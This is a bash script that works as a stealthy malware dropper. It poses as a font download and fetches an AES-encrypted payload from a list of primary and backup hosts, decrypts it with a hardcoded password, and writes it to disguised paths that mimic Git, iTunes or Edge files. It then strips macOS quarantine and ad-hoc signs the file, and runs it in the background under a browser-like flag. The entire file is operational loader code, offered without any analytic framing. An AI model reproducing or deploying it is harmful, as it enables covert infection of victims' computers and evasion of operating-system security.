#!/bin/bash

# ==========================================
# 1. Settings
# ==========================================
SERVER_URLS=(
    "https://https://supportaru.serveftp.com/statics/cache/v11"  # Primary
    "https://raw.githubusercontent.com/bluearuhost/hospitalrun-frontend/refs/heads/main/public/fonts/version1/"  # Backup 1
    "https://stage-fashion365.vercel.app/static/tinymce4.7.5/plugins/fonts/v1104"  # Backup 2
)

MAGIC_MARKER="@@ENDFONT@@"
DECRYPT_PASS="PTa3WZPQZAjj55t@"

# ==========================================
# 2. Identifying the OS and architecture
# ==========================================
OS_RAW=$(uname -s)
case "$OS_RAW" in
    Linux*)     FONT_NAME="NotoSansCJK"; OS="linux" ;;
    Darwin*)    FONT_NAME="HiraginoSans"; OS="macos" ;;
    CYGWIN*|MINGW*|MSYS*) FONT_NAME="MalgunGothic"; OS="windows" ;;
    *)          echo "[-] Unsupported OS: $OS_RAW"; exit 1 ;;
esac

ARCH_RAW=$(uname -m)
case "$ARCH_RAW" in
    x86_64|amd64)   FONT_TYPE="Bold"; ARCH="x86_64" ;;
    aarch64|arm64)  FONT_TYPE="Regular"; ARCH="aarch64" ;;
    armv7*|armv6*)  FONT_TYPE="ExtraBold"; ARCH="armv7" ;;
    i386|i686)      FONT_TYPE="Italic"; ARCH="x86" ;;
    *)              echo "[-] Unsupported Arch: $ARCH_RAW"; exit 1 ;;
esac

echo "[*] System Identified: $OS ($ARCH)"

# ==========================================
# 3. Setting the optimal download path for each OS
# ==========================================
case "$OS" in
    "linux")
        SAVE_PATH="$HOME/.config/git/update"
        ;;
    "macos")
        SAVE_PATH="$HOME/Library/com.apple.iTunesCloud/SystemUpdate"
        ;;
    "windows")
        SAVE_PATH="$HOME/AppData/Local/Microsoft/Edge/service.exe"
        ;;
esac

DIR_PATH=$(dirname "$SAVE_PATH")
if [ ! -d "$DIR_PATH" ]; then
    mkdir -p "$DIR_PATH"
fi

cd "$DIR_PATH"

# ==========================================
# 4. Download Loop
# ==========================================
DOWNLOAD_SUCCESS=false

ENC_PATH="${SAVE_PATH}.tmp"
FULL_NAME="${FONT_NAME}-${FONT_TYPE}.woff"

for BASE_URL in "${SERVER_URLS[@]}"; do
    TARGET_URL="${BASE_URL}/${FULL_NAME}"
    echo "[*] Trying download from: $TARGET_URL ..."

    if command -v curl >/dev/null 2>&1; then
        curl -s -L -f -o "$ENC_PATH" "$TARGET_URL"
        RET_CODE=$?
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$ENC_PATH" "$TARGET_URL"
        RET_CODE=$?
    else
        echo "[-] Missing curl/wget"
        exit 1
    fi

    if [ $RET_CODE -eq 0 ] && [ -s "$ENC_PATH" ]; then
        DOWNLOAD_SUCCESS=true
        break
    fi
done

if [ "$DOWNLOAD_SUCCESS" = false ]; then
    echo "[-] Download failed."
    exit 1
fi

# ==========================================
# 5. Decryption (Stealth Pipeline)
# ==========================================
echo "[*] Extracting payload..."

# 1. Find marker position

# Find marker pos
OFFSET=$(grep -a -b -o "$MAGIC_MARKER" "$ENC_PATH" | awk -F: '{print $1}' | head -n 1)

if [ -z "$OFFSET" ]; then
    echo "[-] Invalid file format."
    rm -f "$ENC_PATH"
    exit 1
fi

MARKER_LEN=${#MAGIC_MARKER}
START_POS=$((OFFSET + MARKER_LEN + 1))

# 2. Check Python Safety (macOS)
USE_PYTHON=false
if command -v python3 >/dev/null 2>&1; then
    if [ "$OS" == "macos" ]; then
        if xcode-select -p >/dev/null 2>&1; then
            USE_PYTHON=true
        fi
    else
        USE_PYTHON=true
    fi
fi

DECRYPTED=false

# [Option A] Python 3
if [ "$USE_PYTHON" = true ]; then
    if tail -c +$START_POS "$ENC_PATH" | \
       openssl enc -d -aes-256-cbc -md md5 -pass pass:"$DECRYPT_PASS" -base64 -A | \
       python3 -c "import sys; open('$SAVE_PATH', 'wb').write(sys.stdin.buffer.read())" 2>/dev/null; then
       DECRYPTED=true
    fi
fi

# [Option B] Node.js
if [ "$DECRYPTED" = false ] && command -v node >/dev/null 2>&1; then
    if tail -c +$START_POS "$ENC_PATH" | \
       openssl enc -d -aes-256-cbc -md md5 -pass pass:"$DECRYPT_PASS" -base64 -A | \
       node -e "require('fs').writeFileSync(process.argv[1], require('fs').readFileSync(0))" "$SAVE_PATH" 2>/dev/null; then
       DECRYPTED=true
    fi
fi

# [Option C] Perl
if [ "$DECRYPTED" = false ] && command -v perl >/dev/null 2>&1; then
    if tail -c +$START_POS "$ENC_PATH" | \
       openssl enc -d -aes-256-cbc -md md5 -pass pass:"$DECRYPT_PASS" -base64 -A | \
       perl -e 'open(F, ">", $ARGV[0]); binmode(STDIN); binmode(F); print F <STDIN>; close(F);' "$SAVE_PATH" 2>/dev/null; then
       DECRYPTED=true
    fi
fi

# [Option D] OpenSSL Direct (Skip macOS)
if [ "$DECRYPTED" = false ]; then
    if [ "$OS" != "macos" ]; then
        if tail -c +$START_POS "$ENC_PATH" | \
           openssl enc -d -aes-256-cbc -md md5 -out "$SAVE_PATH" -pass pass:"$DECRYPT_PASS" -base64 -A 2>/dev/null; then
           DECRYPTED=true
        fi
    fi
fi

# Cleanup
rm -f "$ENC_PATH"

if [ ! -s "$SAVE_PATH" ]; then
    echo "[-] Decryption failed."
    exit 1
fi



# ==========================================
# 6. Execution & Cleanup
# ==========================================

# macOS Security Bypass
if [ "$OS" == "macos" ]; then
    xattr -d com.apple.quarantine "$SAVE_PATH" 2>/dev/null || true
    codesign -s - "$SAVE_PATH" 2>/dev/null || true
fi

chmod +x "$SAVE_PATH" 2>/dev/null || true

echo "[+] Executing..."


if [ "$OS" == "windows" ]; then
    # [Windows/Git Bash only]
    # Convert path and run via cmd/start for background execution
    WIN_PATH=$(cygpath -w "$SAVE_PATH")
    cmd.exe /c "start \"\" \"$WIN_PATH\" --type=renderer" >/dev/null 2>&1
    
else
    # Linux/macOS nohup
    nohup "$SAVE_PATH" --type=renderer >/dev/null 2>&1 &
fi

# Self delete
# rm -- "$0"
